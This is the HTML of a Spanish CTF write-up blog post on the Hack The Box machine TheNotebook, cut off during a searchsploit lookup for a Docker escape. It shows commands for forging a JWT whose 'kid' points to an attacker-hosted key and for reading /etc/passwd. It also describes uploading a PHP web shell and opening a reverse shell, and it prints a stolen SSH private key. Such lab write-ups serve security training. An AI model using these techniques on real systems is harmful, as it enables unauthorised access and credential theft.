<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TheNotebook (Hack The Box)" /><meta name="author" content="J0lm3d0" /><meta property="og:locale" content="es" /><meta name="description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma." /><meta property="og:description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma." /><link rel="canonical" href="https://j0lm3d0.github.io/posts/thenotebook-(hack-the-box)/" /><meta property="og:url" content="https://j0lm3d0.github.io/posts/thenotebook-(hack-the-box)/" /><meta property="og:site_name" content="J0lm3d0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-31T21:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TheNotebook (Hack The Box)" /><meta name="twitter:site" content="@J0lm3d0" /><meta name="twitter:creator" content="@J0lm3d0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J0lm3d0"},"dateModified":"2021-07-31T21:00:00+02:00","datePublished":"2021-07-31T21:00:00+02:00","description":"En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma.","headline":"TheNotebook (Hack The Box)","mainEntityOfPage":{"@type":"WebPage","@id":"https://j0lm3d0.github.io/posts/thenotebook-(hack-the-box)/"},"url":"https://j0lm3d0.github.io/posts/thenotebook-(hack-the-box)/"}</script><title>TheNotebook (Hack The Box) | J0lm3d0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="J0lm3d0"><meta name="application-name" content="J0lm3d0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdna.artstation.com/p/assets/images/images/022/342/774/large/nikita-poghainyi-viber-2019-08-04-15-41-05.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">J0lm3d0</a></div><div class="site-subtitle font-italic">CTF Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>HISTÓRICO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/J0lm3d0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/J0lm3d0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/j0lm3d0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>TheNotebook (Hack The Box)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TheNotebook (Hack The Box)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> J0lm3d0 </span> - <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="31 Jul 2021, 21:00" >31 Jul 2021<i class="unloaded">2021-07-31T21:00:00+02:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2402 palabras">13 minutos de lectura</span></div></div><div class="post-content"><p>En este documento se recogen los pasos a seguir para la resolución de la máquina TheNotebook de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de resolución según la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/machine.png" alt="Logo de la máquina" /></p><p><a href="/pdfs/Write_up_TheNotebook.pdf">Write-up en PDF realizado mediante LaTeX</a></p><h2 id="enumeración-de-servicios-y-recopilación-de-información-sensible">Enumeración de servicios y recopilación de información sensible</h2><p>Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># nmap -p- --open -T5 -n -vv 10.10.10.230</span>

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
</pre></table></code></div></div><p>Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c"># nmap -p 22,80 -sC -sV 10.10.10.230</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Como no dispongo de ninguna credencial para acceder a la máquina mediante SSH, comienzo enumerando el servidor web. Al acceder a la IP a través del navegador, me encuentro la siguiente página:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/indexpage.png" alt="Página principal del servidor web" /></p><p>Por lo que parece, el servidor web tiene una plataforma personalizada para registrar notas y, según el texto, puedo registrarme. Al acceder a la pagina de registro se observa un formulario en el que hay que rellenar los siguientes campos para llevar a cabo el registro:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/registerpage.png" alt="Página de registro del servidor web" /></p><p>Consigo registrarme utilizando “test2” como nombre de usuario y “test2@test.com” como correo electrónico (el usuario “test” ya estaba en uso). Ahora, accedo a la pagina de “login” para entrar a la plataforma con el usuario creado:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/loginpage.png" alt="Página de &quot;login&quot; del servidor web" /></p><p>Una vez entro, veo el panel de usuario, en el que indica que se puede acceder a la sección de notas para registrar nuevas notas o ver las que tengamos registradas:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/userpage.png" alt="Panel principal del usuario de la plataforma web" /></p><p>Al acceder a la sección de notas no veo nada, ya que mi usuario es nuevo y aún no he creado ninguna nueva nota:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/notespage.png" alt="Página de notas de la plataforma web" /></p><p>Al poder registrar texto en la plataforma web, se me ocurre probar algunas inyecciones (SSTI, XSS…) para comprobar si el servidor es vulnerable y así poder aprovecharlo de alguna forma para obtener información sensible y/o conseguir acceso, pero no parece que presente vulnerabilidad alguna.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/injectionstried.png" alt="Inyecciones intentadas en las notas de la plataforma web" /></p><p>Al no encontrar nada relacionado a inyecciones, pruebo a enumerar directorios y/o ficheros ocultos mediante <code class="language-plaintext highlighter-rouge">Gobuster</code>, pero no obtengo ningún resultado que no conociese ya.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.230
/login                (Status: 200) [Size: 1250]
/register             (Status: 200) [Size: 1422]
/admin                (Status: 403) [Size: 9]   
/logout               (Status: 302) [Size: 209] [--&gt; http://10.10.10.230/]
</pre></table></code></div></div><p>Probando peticiones mediante BurpSuite, observo que al acceder a la plataforma, se me asigna una cookie de autenticación.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/authcookie.png" alt="Cookie de autenticación asignada al acceder a la plataforma web" /></p><p>Tras analizar la cookie, compruebo que se trata de un JWT (JSON Web Token), formado principalmente por 3 campos, que se diferencian al estar separados por puntos:</p><ol><li>Header. Está codificado en base64 y al descodificarlo se puede observar una estructura JSON.<li>Payload. Está codificado en base64 y al descodificarlo se puede observar una estructura JSON.<li>Signature. Se utiliza para verificar si el token ha sido firmado y si ha sido alterado de alguna forma. Se puede crear de varias formas, en función del algoritmo de encriptación que se defina.</ol><p>Por tanto, procedo a decodificar los campos header y payload, para obtener los valores en texto claro.</p><div lang="json" class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="err">#</span><span class="w"> </span><span class="err">echo</span><span class="w"> </span><span class="s2">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9"</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">base</span><span class="mi">64</span><span class="w"> </span><span class="err">-d</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">jq</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:7070/privKey.key"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="err">#</span><span class="w"> </span><span class="err">echo</span><span class="w"> </span><span class="s2">"eyJ1c2VybmFtZSI6InRlc3QyIiwiZW1haWwiOiJ0ZXN0MkB0ZXN0LmNvbSIsImFkbWluX2NhcCI6MH0"</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">base</span><span class="mi">64</span><span class="w"> </span><span class="err">-d</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="err">jq</span><span class="w">
</span><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test2"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test2@test.com"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"admin_cap"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>En este caso, en el header se observa que el token utiliza el algoritmo <code class="language-plaintext highlighter-rouge">RS256</code>, por lo que el campo Signature se crearía de la siguiente forma:</p><ol><li>El hash SHA-256 de la concatenación de: Header en Base64 + “.” + Payload en Base 64.<li>La encriptación del hash SHA-256 mediante RSA y una clave privada.<li>El codificado en Base64 del resultado obtenido en el paso anterior.</ol><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Con los datos que aparecen en las estructuras JSON, se me ocurre una forma de falsear la cookie, obteniendo permisos de administrador en la plataforma. Se tendrían que modificar los valores de los campos <code class="language-plaintext highlighter-rouge">kid</code> del header, apuntando a una clave privada que generare en mi máquina, y <code class="language-plaintext highlighter-rouge">admin_cap</code> del payload, cambiando el “false” por un “true”, lo que seguramente nos proporcionaría capacidades de administración en la plataforma.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre># echo "{\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"http://10.10.14.61:7070/privKey.key\"}" | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yMjE6NzA3
MC9wcml2S2V5LmtleSJ9Cg==

# echo "{\"username\":\"test2\",\"email\":\"test2@test.com\",\"admin_cap\":true}" | base64
eyJ1c2VybmFtZSI6InRlc3QyIiwiZW1haWwiOiJ0ZXN0MkB0ZXN0LmNvbSIsImFkbWluX2NhcCI6
dHJ1ZX0K

# openssl genrsa -out privKey.key
Generating RSA private key, 2048 bit long modulus (2 primes)
..........+++++
...................................+++++
e is 65537 (0x010001)
</pre></table></code></div></div><p>Con la ayuda del debugger de <a href="https://jwt.io">jwt.io</a> construyo el token que contendrá el valor de la nueva cookie. Para ello, copio el header modificado en Base64, seguido del payload modificado en Base64 (separando estos 2 campos mediante un punto). Una vez hecho esto, copio la clave privada que he generado mediante <code class="language-plaintext highlighter-rouge">OpenSSL</code> en el campo de texto correspondiente y, automáticamente, realizará las operaciones que he mencionado anteriormente para añadir el campo signature (los caracteres que aparecen en azul turquesa en la imagen) al token que estaba construyendo, dando así por finalizada su creación.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/buildingtoken.png" alt="Construcción del JSON Web Token en jwt.io" /></p><p>Para llevar a cabo la explotación, solo hay que montar un servidor HTTP en el puerto 7070 y en el directorio en el que se encuentra la clave privada, ya que es donde he apuntado en el campo <code class="language-plaintext highlighter-rouge">kid</code> del header. Una vez que este el servidor a la escucha de peticiones, cambio el valor de la cookie mediante un add-on de Firefox de edición de cookies y recargo la pagina, obteniendo así acceso al “Admin Panel”. Indicar también que se debe dejar el servidor del puerto 7070 a la escucha, ya que con cada petición que realicemos se intentará validar la clave privada.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/adminpanel.png" alt="Panel de administrador de la plataforma web" /></p><p>Como se puede ver en la imagen, la plataforma permite a los administradores subir archivos. Para comenzar, probaré a subir una shell en formato .php para comprobar si existe alguna restricción o similar que no permita la subida de este tipo de ficheros</p><p><img data-proofer-ignore data-src="/assets/img/HTB/TheNotebook/phpshell.png" alt="Ejecución de comandos a través de la web shell subida al servidor web" /></p><p>Tras subir la shell, compruebo que funciona correctamente y contamos con ejecución de comandos en la máquina víctima con un usuario no privilegiado. Utilizando algunas sentencias de Python3, me envío una shell a mi máquina de atacante para así trabajar de una forma más cómoda en la escalada de privilegios.</p><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><h3 id="usuario-noah">Usuario noah</h3><p>Una vez obtengo la reverse shell, comienzo a enumerar el servidor Linux para escalar privilegios. Al revisar el fichero <code class="language-plaintext highlighter-rouge">/etc/passwd</code> observo que existe un usuario “noah”, al que seguramente tengamos que escalar antes de convertirnos en root.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>www-data@thenotebook:/var/backups$ cat /etc/passwd | grep "sh$"

root:x:0:0:root:/root:/bin/bash
noah:x:1000:1000:Noah:/home/noah:/bin/bash
</pre></table></code></div></div><p>Continuando con la enumeración del sistema, encuentro en la ruta <code class="language-plaintext highlighter-rouge">/tmp</code> un comprimido <code class="language-plaintext highlighter-rouge">home.tar.gz</code>, que podría ser un backup del directorio <code class="language-plaintext highlighter-rouge">/home</code> de la máquina víctima. Tras descomprimirlo, parece que estaba en lo correcto, ya que observo el directorio de “noah”.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>www-data@thenotebook:/tmp$ ls -la

total 52
drwxrwxrwt 10 root     root     4096 Jul 31 12:42 .
drwxr-xr-x 24 root     root     4096 Jul 31 07:03 ..
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .ICE-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .Test-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .X11-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .XIM-unix
drwxrwxrwt  2 root     root     4096 Jul 30 22:57 .font-unix
drwxrwxrwx  3 www-data www-data 4096 Jul 31 10:47 az
-rw-r--r--  1 www-data www-data  128 Jul 31 10:42 ftpscr
-rw-r--r--  1 www-data www-data 4373 Jul 31 10:41 home.tar.gz
drwx------  3 root     root     4096 Jul 30 22:57 systemd-private-28b58b6239ef4f21800a78fb6d03b283-systemd-timesyncd.service-PiwWLY
drwx------  2 root     root     4096 Jul 30 22:57 vmware-root_812-2957648972

www-data@thenotebook:/tmp$ tar -xf home.tar.gz 

www-data@thenotebook:/tmp$ ls -la home

total 12
drwxr-xr-x  3 www-data www-data 4096 Feb 12 06:24 .
drwxrwxrwt 11 root     root     4096 Jul 31 12:43 ..
drwxr-xr-x  5 www-data www-data 4096 Feb 17 09:02 noah
www-data@thenotebook:/tmp$ ls -la home/noah/
total 32
drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 .
drwxr-xr-x 3 www-data www-data 4096 Feb 12 06:24 ..
-rw-r--r-- 1 www-data www-data  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 www-data www-data 3771 Apr  4  2018 .bashrc
drwx------ 2 www-data www-data 4096 Feb 16 10:47 .cache
drwx------ 3 www-data www-data 4096 Feb 12 06:25 .gnupg
-rw-r--r-- 1 www-data www-data  807 Apr  4  2018 .profile
drwx------ 2 www-data www-data 4096 Feb 17 08:59 .ssh
</pre></table></code></div></div><p>Es posible que el directorio <code class="language-plaintext highlighter-rouge">.ssh'' contenga una clave privada RSA para así podernos conectar a la máquina víctima por el servicio SSH con el usuario</code>noah’’. Tras comprobarlo, obtengo la siguiente clave privada:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>www-data@thenotebook:/tmp$ cat home/noah/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
-----END RSA PRIVATE KEY-----
</pre></table></code></div></div><p>Con la clave privada obtenida me conecto mediante el servicio SSH y visualizo la flag de usuario no privilegiado en la máquina víctima.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre># ssh -l noah -i noah_rsa 10.10.10.230

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
System information as of Sat Jul 31 12:51:41 UTC 2021
Last login: Sat Jul 31 12:51:08 2021 from 10.10.14.61

noah@thenotebook:~$ cat user.txt

d40982b71a3be7b90d5454fb8f5592c2
</pre></table></code></div></div><h3 id="usuario-administrador-root">Usuario administrador (root)</h3><p>Una vez que he conseguido escalar privilegios al usuario “noah”, debo seguir escalando hasta llegar a ser administrador o root. Con el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> compruebo si puede ejecutarse algún archivo con privilegios de otro usuario o sin proporcionar contraseña. En este caso, se puede ejecutar sin proporcionar contraseña <code class="language-plaintext highlighter-rouge">docker exec -it</code> seguido del argumento <code class="language-plaintext highlighter-rouge">webapp-dev01</code> y cualquier comando a ejecutar en dicho contenedor.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>noah@thenotebook:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>

Matching Defaults entries <span class="k">for </span>noah on thenotebook:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User noah may run the following commands on thenotebook:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01<span class="k">*</span>
</pre></table></code></div></div><p>Al acceder al contenedor veo elementos del servidor web: un script en Python para la creación de una base de datos, la clave privada utilizada para la validación del JWT, etc., aunque no aloja el servidor web completo que hemos enumerado y explotado anteriormente.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash

root@59146071d204:/opt/webapp# ls -la

total 52
drwxr-xr-x 1 root root 4096 Feb 12 07:30 .
drwxr-xr-x 1 root root 4096 Feb 12 07:30 ..
drwxr-xr-x 1 root root 4096 Feb 12 07:30 __pycache__
drwxr-xr-x 3 root root 4096 Nov 18  2020 admin
-rw-r--r-- 1 root root 3303 Nov 16  2020 create_db.py
-rw-r--r-- 1 root root 9517 Feb 11 15:00 main.py
-rw------- 1 root root 3247 Feb 11 15:09 privKey.key
-rw-r--r-- 1 root root   78 Feb 12 07:12 requirements.txt
drwxr-xr-x 3 root root 4096 Nov 19  2020 static
drwxr-xr-x 2 root root 4096 Nov 18  2020 templates
-rw-r--r-- 1 root root   20 Nov 20  2020 webapp.tar.gz
</pre></table></code></div></div><p>Tras revisar detenidamente el contenedor, no encontré nada que pudiese ayudarme en la escalada de privilegios a root. Pero debido al privilegio que tenemos mediante <code class="language-plaintext highlighter-rouge">sudo</code>, intuyo que la vía de escalado es esta, por lo que enumero la versión de <code class="language-plaintext highlighter-rouge">docker</code> y descubro que presenta la vulnerabilidad <code class="language-plaintext highlighter-rouge">CVE-2019-5736</code> que permite escapar de un contenedor.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>noah@thenotebook:~$ docker -v

Docker version 18.06.0-ce, build 0ffa825

# searchsploit Docker 18.06

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                             |  Path
